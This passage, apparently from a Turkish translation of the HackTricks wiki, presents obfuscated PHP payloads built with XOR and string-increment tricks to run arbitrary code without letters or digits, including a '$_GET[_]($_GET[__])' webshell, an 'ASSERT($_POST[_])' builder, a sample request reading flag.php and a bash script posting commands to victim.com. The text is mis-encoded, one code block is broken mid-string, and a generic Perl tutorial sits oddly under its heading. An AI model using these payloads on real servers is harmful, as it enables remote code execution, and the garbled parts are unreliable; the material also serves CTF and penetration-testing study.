$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XOR kolay kabuk kodu

[**Bu yazÄ±da**](https://mgp25.com/ctf/Web-challenge/) belirtildiÄŸi gibi, aÅŸaÄŸÄ±daki ÅŸekilde kolay bir kabuk kodu oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Ã–yleyse, **sayÄ± ve harf olmadan keyfi PHP kodu Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z**, aÅŸaÄŸÄ±daki gibi bir istek gÃ¶nderebilir ve keyfi PHP kodunu Ã§alÄ±ÅŸtÄ±rmak iÃ§in bu payloadÄ± kÃ¶tÃ¼ye kullanabilirsiniz:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha detaylÄ± bir aÃ§Ä±klama iÃ§in [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match) adresine bakÄ±n.

### XOR Shellcode (eval iÃ§inde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl benzeri

Perl, genel amaÃ§lÄ± bir betik dili olarak bilinir ve web uygulamalarÄ±nda sÄ±klÄ±kla kullanÄ±lÄ±r. Perl, gÃ¼Ã§lÃ¼ bir dil olup, karmaÅŸÄ±k veri yapÄ±larÄ± ve metin iÅŸleme iÅŸlevleri iÃ§in idealdir. AÅŸaÄŸÄ±da, Perl benzeri bazÄ± Ã¶zellikler ve ipuÃ§larÄ± bulunmaktadÄ±r:

- **DeÄŸiÅŸkenler**: Perl'de deÄŸiÅŸkenler `$` iÅŸareti ile tanÄ±mlanÄ±r. Ã–rneÄŸin, `$name` ÅŸeklinde bir deÄŸiÅŸken tanÄ±mlayabilirsiniz.

- **Diziler**: Perl'de diziler `@` iÅŸareti ile tanÄ±mlanÄ±r. Ã–rneÄŸin, `@numbers` ÅŸeklinde bir dizi tanÄ±mlayabilirsiniz.

- **KoÅŸullu ifadeler**: Perl'de koÅŸullu ifadeler `if`, `else` ve `elsif` anahtar kelimeleri kullanÄ±larak oluÅŸturulur. Ã–rneÄŸin:

```perl
if ($age < 18) {
    print "YaÅŸÄ±nÄ±z 18'den kÃ¼Ã§Ã¼k";
} elsif ($age >= 18 && $age < 30) {
    print "YaÅŸÄ±nÄ±z 18 ile 30 arasÄ±nda";
} else {
    print "YaÅŸÄ±nÄ±z 30'dan bÃ¼yÃ¼k";
}
```

- **DÃ¶ngÃ¼ler**: Perl'de dÃ¶ngÃ¼ler `for`, `foreach`, `while` ve `until` anahtar kelimeleri kullanÄ±larak oluÅŸturulur. Ã–rneÄŸin:

```perl
for my $i (1..10) {
    print "$i\n";
}

foreach my $item (@array) {
    print "$item\n";
}

while ($condition) {
    # Kodunuz
}

until ($condition) {
    # Kodunuz
}
```

- **Fonksiyonlar**: Perl'de fonksiyonlar `sub` anahtar kelimesi ile tanÄ±mlanÄ±r. Ã–rneÄŸin:

```perl
sub say_hello {
    my $name = shift;
    print "Merhaba, $name!\n";
}

say_hello("Ahmet");
```

Perl, bu Ã¶zellikler ve daha fazlasÄ±yla gÃ¼Ã§lÃ¼ bir betik dili olarak web uygulamalarÄ±nÄ±n geliÅŸtirilmesinde ve diÄŸer veri iÅŸleme gÃ¶revlerinde kullanÄ±lmaktadÄ±r.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
